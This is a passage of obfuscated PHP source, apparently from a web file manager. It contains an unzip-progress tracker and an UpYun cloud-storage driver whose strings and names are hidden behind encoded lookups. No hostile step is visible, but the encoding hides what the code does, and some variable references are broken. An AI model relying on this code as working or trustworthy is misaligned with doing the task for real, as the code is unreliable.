$_SERVER[Õò”†—·]; $Åò½Ş»¸ =& $this->task; if (!$Åò½Ş»¸[$÷–çÜÓ—[1113]] || !$Åò½Ş»¸[$÷–çÜÓ—[814]]) { if ($Åò½Ş»¸[$÷–çÜÓ—[1873]] != $÷–çÜÓ—[373]) { return; } } if ($Åò½Ş»¸[$÷–çÜÓ—[1873]] == $÷–çÜÓ—[1248]) { $èîŞ£Åö = 0; if ($Åò½Ş»¸[$÷–çÜÓ—[1808]]) { $èîŞ£Åö = $Åò½Ş»¸[$÷–çÜÓ—[1809]] / $Åò½Ş»¸[$÷–çÜÓ—[1808]]; } $Åò½Ş»¸[$÷–çÜÓ—[1757]] = $èîŞ£Åö * 0.3; } else { if ($Åò½Ş»¸[$÷–çÜÓ—[1873]] == $÷–çÜÓ—[373]) { $èîŞ£Åö = $Åò½Ş»¸[$÷–çÜÓ—[1756]] / $Åò½Ş»¸[$÷–çÜÓ—[1113]]; $Åò½Ş»¸[$÷–çÜÓ—[1757]] = 0.3 + $èîŞ£Åö * 0.4; } else { if ($Åò½Ş»¸[$÷–çÜÓ—[1873]] == $÷–çÜÓ—[120]) { $®—¶ÁûÑ = 0; if ($Åò½Ş»¸[$÷–çÜÓ—[1810]] == $÷–çÜÓ—[120]) { $®—¶ÁûÑ = $Åò½Ş»¸[$÷–çÜÓ—[1809]]; } $èîŞ£Åö = ($Åò½Ş»¸[$÷–çÜÓ—[1813]] + $®—¶ÁûÑ) / $Åò½Ş»¸[$÷–çÜÓ—[814]]; $Åò½Ş»¸[$÷–çÜÓ—[1757]] = 0.3 + 0.4 + $èîŞ£Åö * 0.3; } } } if ($Åò½Ş»¸[$÷–çÜÓ—[1757]] > 0) { $¸Œó ¯ó = timeFloat() - $Åò½Ş»¸[$÷–çÜÓ—[1759]] - $Åò½Ş»¸[$÷–çÜÓ—[1762]]; $Åò½Ş»¸[$÷–çÜÓ—[1763]] = $¸Œó ¯ó * (1 - $Åò½Ş»¸[$÷–çÜÓ—[1757]]) / $Åò½Ş»¸[$÷–çÜÓ—[1757]]; } } public function addFile($ì©ùÔ“û) { $«ù§™¨É =& $_SERVER[Õò”†—·]; $ë®”®Â² =& $this->task; $ºË«Ğì‡ = IO::info($ì©ùÔ“û); $ë®”®Â²[$«ù§™¨É[1806]] = $ºË«Ğì‡[$«ù§™¨É[42]]; $ë®”®Â²[$«ù§™¨É[1808]] = $ºË«Ğì‡[$«ù§™¨É[89]]; $ë®”®Â²[$«ù§™¨É[1809]] = 0; $ë®”®Â²[$«ù§™¨É[1115]] = $«ù§™¨É[1829]; $ë®”®Â²[$«ù§™¨É[1810]] = $«ù§™¨É[1248]; $ë®”®Â²[$«ù§™¨É[814]] = $ºË«Ğì‡[$«ù§™¨É[89]]; $ë®”®Â²[$«ù§™¨É[1113]] = 1; $æ±–€ÆĞ = 0; $ë®”®Â²[$«ù§™¨É[1817]] = array($«ù§™¨É[1818] => $æ±–€ÆĞ + 1, $«ù§™¨É[478] => $ºË«Ğì‡[$«ù§™¨É[42]], $«ù§™¨É[97] => $ºË«Ğì‡[$«ù§™¨É[97]], $«ù§™¨É[567] => $ºË«Ğì‡[$«ù§™¨É[567]] ? $ºË«Ğì‡[$«ù§™¨É[567]] : $ºË«Ğì‡[$«ù§™¨É[97]]); $this->update(); } public function zipEvent($¿£€ûšë, $¯³ĞãÈ•, $ãú‹ş³, $äìÉ÷±ˆ) { $µ½‹öœÜ =& $_SERVER[Õò”†—·]; $œô–±Û =& $this->task; $œô–±Û[$µ½‹öœÜ[1806]] = get_path_this($¯³ĞãÈ•); $œô–±Û[$µ½‹öœÜ[1808]] = $äìÉ÷±ˆ; $œô–±Û[$µ½‹öœÜ[1809]] = $ãú‹ş³; $œô–±Û[$µ½‹öœÜ[1115]] = $¿£€ûšë == $µ½‹öœÜ[1875] ? $µ½‹öœÜ[1876] : $µ½‹öœÜ[1877]; $œô–±Û[$µ½‹öœÜ[1810]] = $µ½‹öœÜ[22]; $œô–±Û[$µ½‹öœÜ[814]] = $äìÉ÷±ˆ; $œô–±Û[$µ½‹öœÜ[1873]] = $µ½‹öœÜ[373]; $this->update(); } public function unzipAfter($ÓäÜÂ) { $Á¯Öö¨Û =& $_SERVER[Õò”†—·]; $ªˆÁ öó =& $this->task; $ªˆÁ öó[$Á¯Öö¨Û[1873]] = $Á¯Öö¨Û[120]; $Îâº = IO::infoWithChildren($ÓäÜÂ); $ë“Öè Ë = 0; $ªˆÁ öó[$Á¯Öö¨Û[1817]] = array($Á¯Öö¨Û[1818] => $ë“Öè Ë + 1, $Á¯Öö¨Û[478] => $Îâº[$Á¯Öö¨Û[42]], $Á¯Öö¨Û[97] => $Îâº[$Á¯Öö¨Û[97]], $Á¯Öö¨Û[567] => $Îâº[$Á¯Öö¨Û[567]] ? $Îâº[$Á¯Öö¨Û[567]] : $Îâº[$Á¯Öö¨Û[97]]); if ($Îâº[$Á¯Öö¨Û[43]] == $Á¯Öö¨Û[231]) { $ªˆÁ öó[$Á¯Öö¨Û[1113]] = 1; } else { $ªˆÁ öó[$Á¯Öö¨Û[1113]] = $Îâº[$Á¯Öö¨Û[92]][$Á¯Öö¨Û[90]]; } $ªˆÁ öó[$Á¯Öö¨Û[1115]] = $Á¯Öö¨Û[22]; $ªˆÁ öó[$Á¯Öö¨Û[1810]] = 0; $ªˆÁ öó[$Á¯Öö¨Û[1756]] = 0; $ªˆÁ öó[$Á¯Öö¨Û[1808]] = 0; $ªˆÁ öó[$Á¯Öö¨Û[1809]] = 0; $ªˆÁ öó[$Á¯Öö¨Û[1806]] = $Á¯Öö¨Û[22]; $ªˆÁ öó[$Á¯Öö¨Û[1813]] = 0; $ªˆÁ öó[$Á¯Öö¨Û[814]] = $Îâº[$Á¯Öö¨Û[89]]; $this->update(); self::log($Á¯Öö¨Û[1878] . json_encode(array($ªˆÁ öó, $Îâº))); } public function nameParse($Õß´ì‹Ş) { $«¢ú¶§ =& $_SERVER[Õò”†—·]; $æ±îğĞ• =& $this->task; if ($æ±îğĞ•[$«¢ú¶§[1873]] == $«¢ú¶§[1248]) { $æ±îğĞ•[$«¢ú¶§[1873]] = $«¢ú¶§[373]; $æ±îğĞ•[$«¢ú¶§[1813]] = 0; $æ±îğĞ•[$«¢ú¶§[814]] = 0; } $ë¹¤Ú™· = get_path_this($Õß´ì‹Ş); if (strstr($ë¹¤Ú™·, $«¢ú¶§[20])) { $æ±îğĞ•[$«¢ú¶§[1756]] += 1; $æ±îğĞ•[$«¢ú¶§[1113]] += 1; } $æ±îğĞ•[$«¢ú¶§[1806]] = $Õß´ì‹Ş; $this->update(); } } goto Dá‡İïÖö†; CÉÄ‹æÉÈ¤: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\72\x2f\x2f\x76\60\56\141\160\x69\x2e\165\160\x79\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($š´Ïä­¬) { parent::__construct(); $this->_init($š´Ïä­¬); } public function _init($åÀ¬»„) { $Çæ¥¤‰Ü =& $_SERVER[Õò”†—·]; foreach ($åÀ¬»„ as $èÙ…Ãû => $ÙÛíîÃÌ) { if (isset($this->{$èÙ…Ãû})) { $this->{$èÙ…Ãû} = $ÙÛíîÃÌ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Çæ¥¤‰Ü[1529] . LNG($Çæ¥¤‰Ü[1433])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¤Á·ğş÷, $ÑÔ³¨éï = "\x47\105\x54") { $€™»®ğ =& $_SERVER[Õò”†—·]; $ªüåĞ Î = gmdate($€™»®ğ[1466]); $Ñƒô›– = base64_encode(hash_hmac($€™»®ğ[1530], "{$ÑÔ³¨éï}\46{$¤Á·ğş÷}\46{$ªüåĞ Î}", md5("{$this->userpass}"), !0)); $şÍÑÑ = array("\101\165\x74\x68\x6f\162\151\172\141\x74\151\x6f\156\x3a\125\120\x59\125\x4e\40{$this->username}\72{$Ñƒô›–}", "\x44\141\164\x65\x3a{$ªüåĞ Î}"); return $şÍÑÑ; } public function ussRequest($úêÖé², $Ù¶–ùøç = "\107\105\124", $äÚ—­àğ = false, $ªĞäƒ«´ = false, $ššîê—— = false) { $üÊ¾Ú¯° =& $_SERVER[Õò”†—·]; $úêÖé² = trim($úêÖé², $üÊ¾Ú¯°[18]); $À»àÀ–ø = "\57{$this->bucket}\57{$úêÖé²}"; $÷‘ØïÖá = $this->ussHeaders($À»àÀ–ø, $Ù¶–ùøç); if ($ªĞäƒ«´) { $÷‘ØïÖá = array_merge($÷‘ØïÖá, $ªĞäƒ«´); } $ÈäÙË‚› = url_request($this->endpoint . $À»àÀ–ø, $Ù¶–ùøç, $äÚ—­àğ, $÷‘ØïÖá, $ššîê——); if (!$ÈäÙË‚›) { $óÁÍ•„¦ = LNG($üÊ¾Ú¯°[1531]); $this->writeLog($óÁÍ•„¦); return array($üÊ¾Ú¯°[1266] => !1, $üÊ¾Ú¯°[1256] => $óÁÍ•„¦); } if (strtolower($Ù¶–ùøç) == $üÊ¾Ú¯°[228] || in_array($ÈäÙË‚›[$üÊ¾Ú¯°[1266]], array($üÊ¾Ú¯°[274], $üÊ¾Ú¯°[1532]))) { $äÚ—­àğ = $ÈäÙË‚›[$üÊ¾Ú¯°[1533]]; } else { $äÚ—­àğ = json_decode($ÈäÙË‚›[$üÊ¾Ú¯°[1256]], !0); if (!$äÚ—­àğ) { $äÚ—­àğ = $ÈäÙË‚›[$üÊ¾Ú¯°[1256]]; } else { if (!$ÈäÙË‚›[$üÊ¾Ú¯°[801]] && isset($äÚ—­àğ[$üÊ¾Ú¯°[1534]])) { $äÚ—­àğ = $äÚ—­àğ[$üÊ¾Ú¯°[1534]]; } } } if (!$ÈäÙË‚›[$üÊ¾Ú¯°[801]]) { $this->writeLog($this->__errorMessage($äÚ—­àğ)); } return array($üÊ¾Ú¯°[1266] => $ÈäÙË‚›[$üÊ¾Ú¯°[801]], $üÊ¾Ú¯°[1256] => $äÚ—­àğ); } private function __errorMessage($«Ú…É˜³) { $úá­—¢ø =& $_SERVER[Õò”†—·]; if (!$«Ú…É˜³) { return $úá­—¢ø[22]; } static $Ò¨ùÙÌ = null; if (!$Ò¨ùÙÌ) { $Ò¨ùÙÌ = I18n::getType(); } if ($Ò¨ùÙÌ != $úá­—¢ø[1476]) { return $«Ú…É˜³; } $¤§Šƒ‰ = array($úá­—¢ø[1535] => $úá­—¢ø[1536], $úá­—¢ø[1537] => $úá­—¢ø[1538], $úá­—¢ø[1539] => $úá­—¢ø[1538], $úá­—¢ø[1540] => $úá­—¢ø[1541], $úá­—¢ø[1542] => $úá­—¢ø[1543], $úá­—¢ø[1544] => $úá­—¢ø[1545], $úá­—¢ø[1546] => $úá­—¢ø[1547]); return isset($¤§Šƒ‰[$«Ú…É˜³]) ? $¤§Šƒ‰[$«Ú…É˜³] : $«Ú…É˜³; } public function mkfile($ö‹ú™¤ğ, $öî¨½Š = '', $êìîàõ = REPEAT_RENAME) { if ($this->setContent($ö‹ú™¤ğ, $öî¨½Š)) { return $this->getPathOuter($ö‹ú™¤ğ); } return !1; } public function mkdir($ïÁíƒ°§, $áöÛé“Æ = REPEAT_SKIP) { $í¼ºÌ‰ =& $_SERVER[Õò”†—·]; $„´¼Í¹ú = trim($ïÁíƒ°§, $í¼ºÌ‰[18]); if ($this->_isFolder($„´¼Í¹ú)) { return $this->getPathOuter($„´¼Í¹ú); } $Û‹æÏ‚ƒ = array($í¼ºÌ‰[1548]); $Ç¿µòŞ¸ = $this->ussRequest($„´¼Í¹ú, $í¼ºÌ‰[258], !1, $Û‹æÏ‚ƒ); return $Ç¿µòŞ¸[$í¼ºÌ‰[1266]] ? $this->getPathOuter($„´¼Í¹ú) : !1; } public function copyFile($¬–üÂı¯, $¿öñÀıò) { $î àˆ”ù =& $_SERVER[Õò”†—·]; $ÈÌ¤Ëö† = array($î àˆ”ù[1549] . "\57{$this->bucket}\x2f{$¬–üÂı¯}", $î àˆ”ù[1550]); $Ğ¥‡¼²Ã = $this->ussRequest($¿öñÀıò, $î àˆ”ù[260], !1, $ÈÌ¤Ëö†); return $Ğ¥‡¼²Ã[$î àˆ”ù[1266]] ? !0 : $this->getPathOuter($¿öñÀıò); } public function moveFile($§¾›ŒÈ, $“¸…–á) { $‹ûòÑëÜ =& $_SERVER[Õò”†—·]; $‡¾ó÷Öó = array($‹ûòÑëÜ[1551] . "\x2f{$this->bucket}\x2f{$§¾›ŒÈ}", $‹ûòÑëÜ[1550]); $àñ¢ëÂ“ = $this->ussRequest($“¸…–á, $‹ûòÑëÜ[260], !1, $‡¾ó÷Öó); return $àñ¢ëÂ“[$‹ûòÑëÜ[1266]] ? !0 : $this->getPathOuter($“¸…–á); } public function delFile($ŒŒÉ¡ÔÊ) { $—âéˆˆ« =& $_SERVER[Õò”†—·]; $‚½ôÅ’ = $this->ussRequest($ŒŒÉ¡ÔÊ, $—âéˆˆ«[1552]); return $‚½ôÅ’[$—âéˆˆ«[1266]] ? !0 : !1; } public function delFolder($ïõ“¹) { $ôîØÁ–° =& $_SERVER[Õò”†—·]; if (!$this->exist($ïõ“¹)) { return !0; } $this->listItemCache = !1; $åóí‚õ = $˜€Ä’åÖ = array(); $this->fileList($ïõ“¹, $åóí‚õ, $˜€Ä’åÖ, !0); $this->listItemCache = !0; foreach ($˜€Ä’åÖ as $¬›¾ÔŞ») { $¤·ìÅÌÎ = $this->ussRequest($¬›¾ÔŞ»[$ôîØÁ–°[42]], $ôîØÁ–°[1552]); if (!$¤·ìÅÌÎ[$ôîØÁ–°[1266]]) { return !1; } } foreach ($åóí‚õ as $®áÈèÉé) { $¤·ìÅÌÎ = $this->ussRequest($®áÈèÉé, $ôîØÁ–°[1552]); if (!$¤·ìÅÌÎ[$ôîØÁ–°[1266]]) { return !1; } } $¤·ìÅÌÎ = $this->ussRequest($ïõ“¹, $ôîØÁ–°[1552]); return $¤·ìÅÌÎ[$ôîØÁ–°[1266]]; } public function rename($¬‚ÓÈ¥Û, $Ü®¨à°ä) { if ($this->isFile($¬‚ÓÈ¥Û)) { $Ü®¨à°ä = get_path_father($¬‚ÓÈ¥Û) . $Ü®¨à°ä; return $this->moveFile($¬‚ÓÈ¥Û, $Ü®¨à°ä); } return $this->renameObject($¬‚ÓÈ¥Û, $Ü®¨à°ä); } public function fileInfo($¶Ô¯£½Ë, $ìÏÏš½Æ = false, $ÙÎÂì†È = array()) { $…ñàö =& $_SERVER[Õò”†—·]; $²”ñìâ = array($…ñàö[42] => $this->pathThis($¶Ô¯£½Ë), $…ñàö[97] => $this->getPathOuter($…ñàö[18] . $¶Ô¯£½Ë), $…ñàö[43] => $…ñàö[231], $…ñàö[89] => isset($ÙÎÂì†È[$…ñàö[89]]) ? $ÙÎÂì†È[$…ñàö[89]] : 0, $…ñàö[188] => $this->ext($¶Ô¯£½Ë)); if ($ìÏÏš½Æ) { return $²”ñìâ; } $²”ñìâ[$…ñàö[232]] = $²”ñìâ[$…ñàö[98]] = 0; $²”ñìâ[$…ñàö[233]] = $²”ñìâ[$…ñàö[234]] = !0; if (empty($ÙÎÂì†È)) { $ÙÎÂì†È = $this->objectMeta($¶Ô¯£½Ë); if (!$ÙÎÂì†È) { return $²”ñìâ; } } $²”ñìâ[$…ñàö[232]] = intval($ÙÎÂì†È[$…ñàö[1553]]); $²”ñìâ[$…ñàö[98]] = intval($ÙÎÂì†È[$…ñàö[1554]]); $²”ñìâ[$…ñàö[89]] = $ÙÎÂì†È[$…ñàö[89]]; return $²”ñìâ; } public function folderInfo($Û›Ÿ»­, $íê´¢úñ = false) { $Ğ¾…ä¢ì =& $_SERVER[Õò”†—·]; $ò¶¾äâŒ = array($Ğ¾…ä¢ì[42] => $this->pathThis($Û›Ÿ»­), $Ğ¾…ä¢ì[97] => $this->getPathOuter($Ğ¾…ä¢ì[18] . $Û›Ÿ»­), $Ğ¾…ä¢ì[43] => $Ğ¾…ä¢ì[88]); if ($íê´¢úñ) { return $ò¶¾äâŒ; } $ò¶¾äâŒ[$Ğ¾…ä¢ì[232]] = $ò¶¾äâŒ[$Ğ¾…ä¢ì[98]] = 0; $ò¶¾äâŒ[$Ğ¾…ä¢ì[233]] = $ò¶¾äâŒ[$Ğ¾…ä¢ì[234]] = !0; if (empty($ß¹ƒ¯ó»)) { $ß¹ƒ¯ó» = $this->objectMeta($Û›Ÿ»­); if (!$ß¹ƒ¯ó») { return $ò¶¾äâŒ; } } $ò¶¾äâŒ[$Ğ¾…ä¢ì[232]] = intval($ß¹ƒ¯ó»[$Ğ¾…ä¢ì[1553]]); $ò¶¾äâŒ[$Ğ¾…ä¢ì[98]] = intval($ß¹ƒ¯ó»[$Ğ¾…ä¢ì[1554]]); return $ò¶¾äâŒ; } private function listObjs($ÓëÅåŒâ, $Ç´ËĞÄ° = 0, $¬¹Á‹‘Ã = 1000) { $Æ²à’ä÷ =& $_SERVER[Õò”†—·]; $ÅíîòÇ› = array($Æ²à’ä÷[1555], $Æ²à’ä÷[1556] . $¬¹Á‹‘Ã); if ($Ç´ËĞÄ°) { $ÅíîòÇ›[] = $Æ²à’ä÷[1557] . $Ç´ËĞÄ°; } $â²ƒ¶½’ = $this->ussRequest($ÓëÅåŒâ, $Æ²à’ä÷[262], !1, $ÅíîòÇ›); return !$â²ƒ¶½’[$Æ²à’ä÷[1266]] ? !1 : $â²ƒ¶½’[$Æ²à’ä÷[1256]]; } private function fileList($ÒÛó¯ƒİ, &$ëÍºÓ²ñ, &$İ¹§˜“İ, $Æ«·œˆÑ = false) { $ï¼ş˜É¶ =& $_SERVER[Õò”†—·]; $âƒå¦Òò = $ï¼ş˜É¶[22]; $‹÷Êóø = 1000; $é”³ºÊñ = rtrim($ÒÛó¯ƒİ, $ï¼ş˜É¶[18]) . $ï¼ş˜É¶[18]; while (!0) { check_abort(); $Ë‡ŠÍ = $this->listObjs($ÒÛó¯ƒİ, $âƒå¦Òò, $‹÷Êóø); if (!$Ë‡ŠÍ) { return !1; } $âƒå¦Òò = isset($Ë‡ŠÍ[$ï¼ş˜É¶[1558]]) ? $Ë‡ŠÍ[$ï¼ş˜É¶[1558]] : $ï¼ş˜É¶[22]; $Ùá·âäæ = isset($Ë‡ŠÍ[$ï¼ş˜É¶[1559]]) ? $Ë‡ŠÍ[$ï¼ş˜É¶[1559]] : array(); foreach ($Ùá·âäæ as $ïöñ×òÀ) { $ùÃ‡÷Ñ“ = $ïöñ×òÀ[$ï¼ş˜É¶[43]] == $ï¼ş˜É¶[88] ? !0 : !1; $ ’‰¸™¥ = ltrim($é”³ºÊñ . $ïöñ×òÀ[$ï¼ş˜É¶[42]], $ï¼ş˜É¶[18]) . ($ùÃ‡÷Ñ“ ? $ï¼ş˜É¶[18] : $ï¼ş˜É¶[22]); $ÓÉŞ”È­ = array($ï¼ş˜É¶[42] => $ ’‰¸™¥, $ï¼ş˜É¶[43] => $ùÃ‡÷Ñ“ ? $ï¼ş˜É¶[88] : $ï¼ş˜É¶[231], $ï¼ş˜É¶[89] => $ïöñ×òÀ[$ï¼ş˜É¶[397]], $ï¼ş˜É¶[1554] => $ïöñ×òÀ[$ï¼ş˜É¶[1560]]); $this->cacheMethodInfoSet($ ’‰¸™¥, $ùÃ‡÷Ñ“, $ÓÉŞ”È­); if ($ùÃ‡÷Ñ“) { $ëÍºÓ²ñ[] = $ ’‰¸™¥; if ($Æ«·œˆÑ) { $this->fileList($ ’‰¸™¥, $ëÍºÓ²ñ, $İ¹§˜“İ, $Æ«·œˆÑ); } continue; } $İ¹§˜“İ[] = $ÓÉŞ”È­; } if (count($Ùá·âäæ) < $‹÷Êóø) { break; } } $this->cacheMethodInfoSet($ÒÛó¯ƒİ, !0); } public function listPath($çàÇ€Á¢, $âşªĞòÎ = false) { $íšÆÌ¥Û =& $_SERVER[Õò”†—·]; $…¿­àË  = $ıÜûó•ê = array(); $this->fileList($çàÇ€Á¢, $…¿­àË , $ıÜûó•ê); foreach ($…¿­àË  as $Ö¤àÔš => $¥ı™ãú¥) { $…¿­àË [$Ö¤àÔš] = $this->folderInfo($¥ı™ãú¥, $âşªĞòÎ); } foreach ($ıÜûó•ê as $Ö¤àÔš => $¥ı™ãú¥) { $ıÜûó•ê[$Ö¤àÔš] = $this->fileInfo($¥ı™ãú¥[$íšÆÌ¥Û[42]], $âşªĞòÎ, $¥ı™ãú¥); } return array($íšÆÌ¥Û[95] => $…¿­àË , $íšÆÌ¥Û[96] => $ıÜûó•ê); } public function has($×ôğÇÄ, $€²š’Â› = false, $“Ã©¬ùê = true) { $û«ÚÓ¨» =& $_SERVER[Õò”†—·]; $Ğ¨Ñ×ëí = $û«ÚÓ¨»[22]; $Şù‘Ã×µ = 500; $®Ê–ä¹¥ = 0; $ú¢…ªÆ = 0; $¸Ô°é¾Ê = rtrim($×ôğÇÄ, $û«ÚÓ¨»[18]) . $û«ÚÓ¨»[18]; while (!0) { check_abort(); $òş­Ó·Ğ = $this->listObjs($×ôğÇÄ, $Ğ¨Ñ×ëí, $Şù‘Ã×µ); if (!$òş­Ó·Ğ) { return !1; } $Ğ¨Ñ×ëí = isset($òş­Ó·Ğ[$û«ÚÓ¨»[1558]]) ? $òş­Ó·Ğ[$û«ÚÓ¨»[1558]] : $û«ÚÓ¨»[22]; $èÙ™Ù“ë = isset($òş­Ó·Ğ[$û«ÚÓ¨»[1559]]) ? $òş­Ó·Ğ[$û«ÚÓ¨»[1559]] : array(); if (empty($èÙ™Ù“ë)) { break; } $ÉÉı’ÛÔ = array_filter($èÙ™Ù“ë, function ($Â£õòöˆ) { $©™µÊĞè =& $_SERVER[Õò”†—·]; return $Â£õòöˆ[$©™µÊĞè[43]] == $©™µÊĞè[88]; }); $¹ÈÈ¡‹º = count($èÙ™Ù“ë); $ÉÉı’ÛÔ = count($ÉÉı’ÛÔ); $ú†á¡ŞŸ = $¹ÈÈ¡‹º - $ÉÉı’ÛÔ; if ($€²š’Â›) { $ú¢…ªÆ += $ÉÉı’ÛÔ; $®Ê–ä¹¥ += $ú†á¡ŞŸ; if ($¹ÈÈ¡‹º < $Şù‘Ã×µ) { break; } continue; } if ($“Ã©¬ùê) { if ($ú†á¡ŞŸ) { return !0; } } else { if ($ÉÉı’ÛÔ) { return !0; } } if ($¹ÈÈ¡‹º < $Şù‘Ã×µ) { break; } } if ($€²š’Â›) { return array($û«ÚÓ¨»[240] => $®Ê–ä¹¥, $û«ÚÓ¨»[241] => $ú¢…ªÆ); } return !1; } public function listAll($ÀÌéáäú) { $¾»¯ù›Ï =& $_SERVER[Õò”†—·]; $†×§×Û = $Ù®Ñ¼ÍÉ = array(); $this->fileList($ÀÌéáäú, $†×§×Û, $Ù®Ñ¼ÍÉ, !0); $‹ Æ— = array_to_keyvalue($Ù®Ñ¼ÍÉ, $¾»¯ù›Ï[42]); foreach ($†×§×Û as $±¡†İ§) { if (is_string($±¡†İ§)) { $‹ Æ—[$±¡†İ§] = array($¾»¯ù›Ï[89] => 0); } } return $this->listAllFiles($ÀÌéáäú, $‹ Æ—); } public function canRead($ø˜ã×–µ) { return $this->exist($ø˜ã×–µ) ? !0 : !1; } public function canWrite($û Šû¦°) { return $this->exist($û Šû¦°) ? !0 : !1; } public function getContent($ªÑã©‰È) { return $this->fileSubstr($ªÑã©‰È, 0, -1); } public function setContent($ë¬ù«‘…, $™ú¶ğü” = '') { $şÃœÉ„ù =& $_SERVER[Õò”†—·]; if (!$™ú¶ğü”) { $¦È–ì¬Œ = $this->ussRequest($ë¬ù«‘…, $şÃœÉ„ù[258]); return $¦È–ì¬Œ[$şÃœÉ„ù[1266]]; } $È§Ù… = $this->tempFile($this->pathThis($ë¬ù«‘…)); file_put_contents($È§Ù…, $™ú¶ğü”); if ($this->upload($ë¬ù«‘…, $È§Ù…)) { $this->tempFileRemve($È§Ù…); return !0; } return !1; } public function fileSubstr($‚‘’û·, $ã¢£ø„, $„…œ—™) { $ñºÇ¶÷ =& $_SERVER[Õò”†—·]; if (!($Œâ»¢ÊÉ = $this->link($‚‘’û·))) { return !1; } $Á ¾õÌ = !1; if ($„…œ—™ > 0) { $î †ê¸ = $ã¢£ø„ + $„…œ—™ - 1; $Á ¾õÌ = array($ñºÇ¶÷[1508] . $ã¢£ø„ . $ñºÇ¶÷[446] . $î †ê¸); } $˜ “Å½¤ = url_request($Œâ»¢ÊÉ, $ñºÇ¶÷[262], !1, $Á ¾õÌ); return $˜ “Å½¤[$ñºÇ¶÷[801]] ? $˜ “Å½¤[$ñºÇ¶÷[1256]] : !1; } public function upload($‰€ììË¹, $åŒÏ©¤, $©ƒ©‡Ÿ = false, $—äËÌ¡Æ = REPEAT_REPLACE) { $–¨á›×¢ =& $_SERVER[Õò”†—·]; $ŒÏİö¹æ = IO::size($åŒÏ©¤); if ($ŒÏİö¹æ <= 1024 * 1024 * 200) { $²ã¦‚¸‘ = array($–¨á›×¢[1561] . $åŒÏ©¤); $Ê¯ÄãÜÃ = $this->ussRequest($‰€ììË¹, $–¨á›×¢[260], $²ã¦‚¸‘); return $Ê¯ÄãÜÃ[$–¨á›×¢[1266]] ? $this->getPathOuter($‰€ììË¹) : !1; } $–å”öØÔ = 1024 * 1024 * 10; $œÅŸ¤áÄ = array($–¨á›×¢[1562], $–¨á›×¢[1563] . $ŒÏİö¹æ, $–¨á›×¢[1564], $–¨á›×¢[1565] . $–å”öØÔ); $Ê¯ÄãÜÃ = $this->ussRequest($‰€ììË¹, $–¨á›×¢[260], !1, $œÅŸ¤áÄ); if (!$Ê¯ÄãÜÃ[$–¨á›×¢[1266]]) { return !1; } $±ı¿Ó¤› = $Ê¯ÄãÜÃ[$–¨á›×¢[1256]]; $€¢úîîñ = 0; $ ²îÜÇ” = $±ı¿Ó¤›[$–¨á›×¢[1566]]; $ºöÜÈŞÖ = fopen($åŒÏ©¤, $–¨á›×¢[1427]); if (!$ºöÜÈŞÖ) { return !1; } do { $åâÖ‡‡Ç = $±ı¿Ó¤›[$–¨á›×¢[1567]]; fseek_64($ºöÜÈŞÖ, $€¢úîîñ); $€Ø‘¹é = fread($ºöÜÈŞÖ, $åâÖ‡‡Ç); $¥Â´Ÿ²¸ = 0; do { $¥Â´Ÿ²¸++; $±ı¿Ó¤› = $this->uploadPart($‰€ììË¹, $±ı¿Ó¤›, $€Ø‘¹é); } while (!$±ı¿Ó¤› && $¥Â´Ÿ²¸ < 3); if (!$±ı¿Ó¤›) { return !1; } $ ²îÜÇ” = $±ı¿Ó¤›[$–¨á›×¢[1566]]; $€¢úîîñ += $åâÖ‡‡Ç; } while ($ ²îÜÇ” != -1); fclose($ºöÜÈŞÖ); $œÅŸ¤áÄ = array($–¨á›×¢[1568], $–¨á›×¢[1569] . $±ı¿Ó¤›[$–¨á›×¢[1570]], $–¨á›×¢[1564]); $Ê¯ÄãÜÃ = $this->ussRequest($‰€ììË¹, $–¨á›×¢[260], !1, $œÅŸ¤áÄ); return $Ê¯ÄãÜÃ[$–¨á›×¢[1266]] ? $this->getPathOuter($Á •ï½¶) : !1; } private function uploadPart($é²€ì‡, $Ø¼Õû·€, &$îê†÷Äà) { $¬ñı•Íµ =& $_SERVER[Õò”†—·]; $¡¼–úŒ§ = array($¬ñı•Íµ[1571], $¬ñı•Íµ[1569] . $Ø¼Õû·€[$¬ñı•Íµ[1570]], $¬ñı•Íµ[1572] . $Ø¼Õû·€[$¬ñı•Íµ[1566]], $¬ñı•Íµ[156] . $Ø¼Õû·€[$¬ñı•Íµ[1567]]); $Îˆ€³«¢ = $this->ussRequest($é²€ì‡, $¬ñı•Íµ[260], $îê†÷Äà, $¡¼–úŒ§); return !$Îˆ€³«¢[$¬ñı•Íµ[1266]] ? $Îˆ€³«¢[$¬ñı•Íµ[1266]] : $Îˆ€³«¢[$¬ñı•Íµ[1256]]; } public function uploadFormData($ãÙšäĞ, $ÉåÈÌ = 3600) { return $this->uploadPolicy($ãÙšäĞ, $ÉåÈÌ); } public function multiUploadFormData($¥Ã•ûı¦, $ë§£Œû„ = 3600) { $ÓÜ¬ÙØ· =& $_SERVER[Õò”†—·]; $öèŒØòï = (int) $GLOBALS[$ÓÜ¬ÙØ·[17]][$ÓÜ¬ÙØ·[89]]; return $this->uploadPolicy($¥Ã•ûı¦, $ë§£Œû„, $öèŒØòï); } private function uploadPolicy($Û§³¡”Ï, $Ü«¦ç«Î = 3600, $ûÑÑÙÙ = 0) { $•“äÌòÖ =& $_SERVER[Õò”†—·]; $„Õúˆ¡´ = $•“äÌòÖ[18] . $this->bucket; $ôÓÂœç­ = gmdate($•“äÌòÖ[1466]); $¿§÷Ğş× = array($•“äÌòÖ[1573] => $this->bucket, $•“äÌòÖ[1574] => $Û§³¡”Ï, $•“äÌòÖ[1575] => time() + $Ü«¦ç«Î, $•“äÌòÖ[1576] => $ôÓÂœç­); if ($ûÑÑÙÙ) { $¿§÷Ğş×[$•“äÌòÖ[1447]] = $ûÑÑÙÙ; } $éà©ŞÁé = base64_encode(json_encode($¿§÷Ğş×)); $ªè½–ÎÃ = base64_encode(hash_hmac($•“äÌòÖ[1530], "\120\117\x53\124\46{$„Õúˆ¡´}\46{$ôÓÂœç­}\x26{$éà©ŞÁé}", md5("{$this->userpass}"), !0)); $Ùœè¾¼é = array($•“äÌòÖ[293] => $éà©ŞÁé, $•“äÌòÖ[1577] => "\125\120\x59\125\x4e\40{$this->username}\x3a{$ªè½–ÎÃ}", $•“äÌòÖ[209] => $this->endpoint . $„Õúˆ¡´); return $Ùœè¾¼é; } public function download($Í¹¬àÓï, $‰ºÔì) { 